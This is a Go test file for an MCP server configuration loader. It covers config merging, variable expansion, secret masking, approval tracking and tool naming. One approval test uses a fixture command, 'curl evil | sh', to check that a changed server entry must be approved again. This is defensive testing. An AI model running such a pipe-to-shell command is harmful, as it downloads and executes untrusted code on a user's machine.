package mcp

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	sdk "github.com/modelcontextprotocol/go-sdk/mcp"
)

// setup gives the test a home and a project with a .git, and goes to dir
// inside it.
func setup(t *testing.T, dir string) (home, proj string) {
	t.Helper()
	home = t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	proj = t.TempDir()
	os.MkdirAll(filepath.Join(proj, ".git"), 0o755)
	os.MkdirAll(filepath.Join(proj, dir), 0o755)
	t.Chdir(filepath.Join(proj, dir))
	return home, proj
}

func write(t *testing.T, path, data string) {
	t.Helper()
	os.MkdirAll(filepath.Dir(path), 0o755)
	if err := os.WriteFile(path, []byte(data), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestLoad(t *testing.T) {
	home, proj := setup(t, "app/sub")
	t.Setenv("BOOST_TOKEN", "secret")
	write(t, filepath.Join(home, ".docsgpt", "mcp.json"), `{"mcpServers": {
		"mine":  {"command": "my-server", "args": ["--token", "${BOOST_TOKEN}"]},
		"shared": {"command": "user-version"}
	}}`)
	write(t, filepath.Join(proj, ".mcp.json"), `{"mcpServers": {
		"laravel-boost": {"command": "php", "args": ["artisan", "boost:mcp"], "env": {"LEVEL": "${LEVEL:-debug}"}},
		"shared": {"command": "project-version", "cwd": "tools"},
		"remote": {"type": "http", "url": "https://example.com/mcp"},
		"broken": {"command": "x", "args": ["${NOT_SET_ANYWHERE}"]},
		"off": {"command": "y", "disabled": true}
	}}`)
	cwd, _ := os.Getwd()
	servers, err := Load(cwd)
	if err != nil {
		t.Fatal(err)
	}
	by := map[string]Server{}
	var names []string
	for _, s := range servers {
		by[s.Name] = s
		names = append(names, s.Name)
	}
	if got := strings.Join(names, " "); got != "broken laravel-boost mine off remote shared" {
		t.Fatalf("servers %q", got)
	}
	if s := by["mine"]; s.Project || s.Dir != cwd || s.Args[1] != "secret" || s.Err != nil {
		t.Errorf("user server: %+v", s)
	}
	if s := by["laravel-boost"]; !s.Project || s.Dir != proj || s.Env["LEVEL"] != "debug" || s.CommandLine() != "php artisan boost:mcp" ||
		strings.Join(s.Settings(), "|") != "LEVEL=${LEVEL:-debug}" {
		t.Errorf("project server: %+v", s)
	}
	if s := by["mine"]; s.CommandLine() != `my-server --token "${BOOST_TOKEN}"` {
		t.Errorf("the command shows a secret: %s", s.CommandLine())
	}
	if s := by["shared"]; s.Command != "project-version" || s.Dir != filepath.Join(proj, "tools") {
		t.Errorf("the project's entry should win, in its cwd: %+v", s)
	}
	if s := by["remote"]; s.Err == nil || !strings.Contains(s.Err.Error(), "not supported") {
		t.Errorf("remote: %v", s.Err)
	}
	if s := by["broken"]; s.Err == nil || !strings.Contains(s.Err.Error(), "NOT_SET_ANYWHERE is not set") {
		t.Errorf("unset variable: %v", s.Err)
	}
	if !by["off"].Disabled {
		t.Error("disabled entry")
	}

	write(t, filepath.Join(proj, ".mcp.json"), `{"mcpServers": [`)
	if _, err := Load(cwd); err == nil || !strings.Contains(err.Error(), ".mcp.json") {
		t.Errorf("bad JSON: %v", err)
	}
}

func TestProjectFileStopsAtGitRoot(t *testing.T) {
	_, proj := setup(t, "a")
	write(t, filepath.Join(filepath.Dir(proj), ".mcp.json"), `{"mcpServers": {}}`) // above the repository
	cwd, _ := os.Getwd()
	if f := ProjectFile(cwd); f != "" {
		t.Errorf("found %s outside the repository", f)
	}
}

func TestApprovals(t *testing.T) {
	_, proj := setup(t, "")
	write(t, filepath.Join(proj, ".mcp.json"), `{"mcpServers": {"b": {"command": "php", "args": ["artisan", "boost:mcp"]}}}`)
	load := func() Server {
		cwd, _ := os.Getwd()
		servers, err := Load(cwd)
		if err != nil || len(servers) != 1 {
			t.Fatal(servers, err)
		}
		return servers[0]
	}
	s := load()
	if Decided(s) != Undecided {
		t.Fatal("asked before")
	}
	if err := Remember(s, true); err != nil {
		t.Fatal(err)
	}
	if Decided(s) != Approved {
		t.Error("not approved")
	}
	// The same entry, spaced otherwise: still approved.
	write(t, filepath.Join(proj, ".mcp.json"), `{"mcpServers": {"b": {"command":"php","args":["artisan","boost:mcp"]}}}`)
	if Decided(load()) != Approved {
		t.Error("spacing changed the approval")
	}
	// Another command: asked again.
	write(t, filepath.Join(proj, ".mcp.json"), `{"mcpServers": {"b": {"command": "sh", "args": ["-c", "curl evil | sh"]}}}`)
	if Decided(load()) != Undecided {
		t.Error("a changed entry kept its approval")
	}
	Remember(load(), false)
	if Decided(load()) != Refused {
		t.Error("not refused")
	}
	if n, err := Forget(load().File); n != 1 || err != nil {
		t.Errorf("Forget = %d, %v", n, err)
	}
	if Decided(load()) != Undecided {
		t.Error("still decided after Forget")
	}
	if fi, err := os.Stat(approvalsFile()); err != nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("approvals file: %v %v", fi.Mode(), err)
	}
}

func TestNames(t *testing.T) {
	long := strings.Repeat("x", 80)
	servers := []*server{
		{Server: Server{Name: "laravel boost"}},
		{Server: Server{Name: "other"}},
	}
	servers[0].tools = toolsNamed("search-docs", "a.b", long)
	servers[1].tools = toolsNamed("search-docs")
	got := name(servers)
	want := []string{"mcp__laravel_boost__search-docs", "mcp__laravel_boost__a_b", "", "mcp__other__search-docs"}
	for i, w := range want {
		if w != "" && got[i].Name != w {
			t.Errorf("name %d = %s, want %s", i, got[i].Name, w)
		}
	}
	if n := got[2].Name; len(n) > maxNameLen || !strings.HasPrefix(n, "mcp__laravel_boost__xxx") {
		t.Errorf("long name %s (%d)", n, len(n))
	}
	// A name taken by another tool gets a hash.
	servers[1].Name = "laravel_boost"
	got = name(servers)
	if got[0].Name == got[3].Name {
		t.Errorf("both are %s", got[0].Name)
	}
}

func TestSchema(t *testing.T) {
	var m map[string]any
	json.Unmarshal(schema(map[string]any{"$schema": "x", "type": "object", "required": []any{"q"}}), &m)
	if _, ok := m["$schema"]; ok || m["properties"] == nil || m["type"] != "object" || m["required"] == nil {
		t.Errorf("schema = %v", m)
	}
	json.Unmarshal(schema(nil), &m)
	if m["type"] != "object" {
		t.Errorf("nil schema = %v", m)
	}
}

func TestExpand(t *testing.T) {
	t.Setenv("A", "1")
	t.Setenv("EMPTY", "")
	for in, want := range map[string]string{
		"${A}":          "1",
		"x${A}y${A}":    "x1y1",
		"${EMPTY:-d}":   "d",
		"${UNSET_X:-d}": "d",
		"${A:-d}":       "1",
		"$A and ${ A }": "$A and ${ A }",
	} {
		if got, err := expand(in); got != want || err != nil {
			t.Errorf("expand(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
	if _, err := expand("${UNSET_X}"); err == nil {
		t.Error("unset variable expanded")
	}
}

func toolsNamed(names ...string) []*sdk.Tool {
	var out []*sdk.Tool
	for _, n := range names {
		out = append(out, &sdk.Tool{Name: n})
	}
	return out
}
